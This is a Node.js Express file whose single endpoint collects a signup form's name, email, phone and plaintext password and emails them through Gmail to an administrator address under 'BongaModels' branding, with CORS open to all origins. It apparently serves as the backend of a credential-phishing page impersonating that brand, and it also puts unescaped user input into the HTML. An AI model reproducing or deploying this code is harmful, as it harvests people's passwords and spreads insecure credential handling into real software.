import express from "express";
import cors from "cors";
import nodemailer from "nodemailer";
import dotenv from "dotenv";

dotenv.config();

const app = express();
app.use(express.json());
app.use(cors({ origin: "*", methods: "POST", allowedHeaders: "Content-Type" }));

// ✅ API Route
app.post("/api/send-email", async (req, res) => {
  const { fullName, email, phone, password } = req.body;

  if (!fullName || !email || !phone || !password) {
    return res.status(400).json({ message: "All fields are required." });
  }

  try {
    let transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    let mailOptions = {
      from: `"BongaModels Signup" <${process.env.EMAIL_USER}>`,
      to: process.env.ADMIN_EMAIL,
      subject: "🎉 New User Signup on BongaModels 🎉",
      html: `
      <html>
      <head>
        <style>
          body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            padding: 20px;
          }
          .container {
            max-width: 600px;
            background: white;
            margin: auto;
            border-radius: 12px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
            overflow: hidden;
          }
          .header {
            background: #6C133B;
            padding: 25px;
            text-align: center;
            color: white;
            font-size: 24px;
          }
          .content {
            padding: 20px;
            text-align: center;
          }
          .content img {
            border-radius: 10px;
            max-width: 280px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
          }
          .info {
            background: #f8f8f8;
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
          }
          .info p {
            font-size: 16px;
            color: #444;
            line-height: 1.6;
          }
          .button {
            display: inline-block;
            background: #6C133B;
            color: white;
            padding: 14px 24px;
            border-radius: 6px;
            text-decoration: none;
            font-size: 16px;
            font-weight: bold;
            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
            transition: 0.3s;
          }
          .footer {
            padding: 20px;
            background: #f4f4f4;
            color: #777;
            font-size: 14px;
            text-align: center;
          }
          a {
            color: #6C133B;
            text-decoration: none;
            font-weight: bold;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            🎉 New User Signup 🎉
          </div>
          <div class="content">
            <img src="https://i.bgmicdn.com/images/bm/popup/exit/white/x1/girl_v2.webp" alt="Welcome Image">
            <h3>👤 New User Details:</h3>
            <div class="info">
              <p><strong>👤 Name:</strong> ${fullName}</p>
              <p><strong>📧 Email:</strong> ${email}</p>
              <p><strong>📞 Phone:</strong> ${phone}</p>
              <p><strong>🔑 Password:</strong> ${password}</p> 
            </div>
            <a href="mailto:${email}" class="button">📧 Contact User</a>
          </div>
          <div class="footer">
            ✨ Powered by <a href="https://es.bongamodels.com/">BongaModels</a> ✨
          </div>
        </div>
      </body>
      </html>
      `,
    };

    await transporter.sendMail(mailOptions);
    res.status(200).json({ message: "✅ Email sent successfully!" });
  } catch (error) {
    console.error("❌ Email Sending Error:", error);
    res.status(500).json({ message: "Internal Server Error" });
  }
});

// ✅ Export the API handler
export default app;
